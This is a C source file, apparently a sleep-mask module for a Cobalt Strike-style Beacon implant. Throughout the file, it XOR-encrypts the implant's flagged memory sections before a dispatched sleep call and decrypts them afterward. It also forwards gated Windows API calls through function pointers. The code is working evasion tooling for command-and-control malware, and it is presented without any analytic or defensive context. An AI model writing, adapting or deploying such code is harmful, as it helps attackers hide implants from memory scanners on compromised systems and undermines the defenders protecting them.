#include <sleepmask.h>

WINBASEAPI DWORD  WINAPI KERNEL32$WaitForSingleObject( HANDLE, DWORD );
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentThread( VOID );

#define WaitForSingleObject KERNEL32$WaitForSingleObject
#define GetCurrentThread    KERNEL32$GetCurrentThread

static void xor_region( unsigned char *buf, unsigned int len, unsigned char *key, unsigned int key_len ) {
    for ( unsigned int i = 0; i < len; i++ ) {
        buf[i] ^= key[i % key_len];
    }
}

static ULONG_PTR dispatch_call( PFUNCTION_CALL fc ) {
    ULONG_PTR ret = 0;
    switch ( fc->numOfArgs ) {
        case 0:  ret = ((BEACON_GATE_00) fc->functionPtr)(); break;
        case 1:  ret = ((BEACON_GATE_01) fc->functionPtr)( fc->args[0] ); break;
        case 2:  ret = ((BEACON_GATE_02) fc->functionPtr)( fc->args[0], fc->args[1] ); break;
        case 3:  ret = ((BEACON_GATE_03) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2] ); break;
        case 4:  ret = ((BEACON_GATE_04) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3] ); break;
        case 5:  ret = ((BEACON_GATE_05) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4] ); break;
        case 6:  ret = ((BEACON_GATE_06) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5] ); break;
        case 7:  ret = ((BEACON_GATE_07) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6] ); break;
        case 8:  ret = ((BEACON_GATE_08) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7] ); break;
        case 9:  ret = ((BEACON_GATE_09) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7], fc->args[8] ); break;
        case 10: ret = ((BEACON_GATE_10) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7], fc->args[8], fc->args[9] ); break;
    }
    return ret;
}

VOID sleep_mask( PBEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {

    if ( ! functionCall )
        return;

    /* Beacon gate dispatch - no masking */
    if ( ! functionCall->bMask ) {
        functionCall->retValue = dispatch_call( functionCall );
        return;
    }

    /* XOR encrypt beacon memory before sleep */
    for ( int r = 0; r < 6; r++ ) {
        PALLOCATED_MEMORY_REGION reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
        if ( ! reg->AllocationBase || reg->RegionSize == 0 )
            continue;

        for ( int s = 0; s < 8; s++ ) {
            PALLOCATED_MEMORY_SECTION sec = &reg->Sections[s];
            if ( ! sec->BaseAddress || sec->VirtualSize == 0 )
                continue;
            if ( ! sec->MaskSection )
                continue;

            xor_region(
                (unsigned char *)sec->BaseAddress,
                (unsigned int)sec->VirtualSize,
                (unsigned char *)beaconInfo->mask,
                MASK_SIZE
            );
        }
    }

    /* Sleep via dispatched API call */
    functionCall->retValue = dispatch_call( functionCall );

    /* XOR decrypt beacon memory after sleep */
    for ( int r = 0; r < 6; r++ ) {
        PALLOCATED_MEMORY_REGION reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
        if ( ! reg->AllocationBase || reg->RegionSize == 0 )
            continue;

        for ( int s = 0; s < 8; s++ ) {
            PALLOCATED_MEMORY_SECTION sec = &reg->Sections[s];
            if ( ! sec->BaseAddress || sec->VirtualSize == 0 )
                continue;
            if ( ! sec->MaskSection )
                continue;

            xor_region(
                (unsigned char *)sec->BaseAddress,
                (unsigned int)sec->VirtualSize,
                (unsigned char *)beaconInfo->mask,
                MASK_SIZE
            );
        }
    }
}
